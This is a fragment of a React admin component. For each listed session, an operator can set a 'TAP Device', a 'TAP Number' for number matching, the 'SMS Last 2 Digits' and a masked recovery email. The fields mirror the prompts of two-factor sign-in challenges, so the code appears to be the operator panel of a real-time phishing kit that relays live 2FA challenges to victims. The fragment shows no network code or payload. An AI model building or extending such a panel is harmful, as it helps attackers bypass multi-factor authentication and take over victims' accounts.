                              </Button>
                            </div>
                          )}
                        </div>

                        {editingControls === session.session_id ? (
                          <div className="grid grid-cols-2 gap-2 mt-2">
                            <div>
                              <Label className="text-xs">TAP Device</Label>
                              <Input
                                value={controlsForm.tapDeviceInfo}
                                onChange={(e) => setControlsForm({ ...controlsForm, tapDeviceInfo: e.target.value })}
                                placeholder="iPhone"
                                className="h-8 text-xs"
                              />
                            </div>
                            <div>
                              <Label className="text-xs">TAP Number</Label>
                              <Input
                                value={controlsForm.tapMatchingNumber}
                                onChange={(e) => setControlsForm({ ...controlsForm, tapMatchingNumber: e.target.value })}
                                placeholder="45"
                                maxLength={3}
                                className="h-8 text-xs"
                              />
                            </div>
                            <div>
                              <Label className="text-xs">SMS Last 2 Digits</Label>
                              <Input
                                value={controlsForm.smsLastDigits}
                                onChange={(e) => setControlsForm({ ...controlsForm, smsLastDigits: e.target.value })}
                                placeholder="45"
                                maxLength={2}
                                className="h-8 text-xs"
                              />
                            </div>
                            <div>
                              <Label className="text-xs">Recovery Email</Label>
                              <Input
                                value={controlsForm.recoveryEmail}
                                onChange={(e) => setControlsForm({ ...controlsForm, recoveryEmail: e.target.value })}
                                placeholder="****@****.***"
                                className="h-8 text-xs"
                              />
                            </div>
                          </div>
                        ) : (
                          <div className="grid grid-cols-2 gap-2 text-xs text-gray-600">
                            <div><strong>TAP Device:</strong> {session.admin_tap_device_info || 'Not set'}</div>
                            <div><strong>TAP Number:</strong> {session.admin_tap_matching_number || 'Not set'}</div>
                            <div><strong>SMS Digits:</strong> {session.admin_sms_last_digits ? `**${session.admin_sms_last_digits}` : 'Not set'}</div>
                            <div><strong>Recovery Email:</strong> {session.admin_recovery_email || 'Not set'}</div>
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          )}
        </CardContent>
      </Card>
    </div>
  )
} 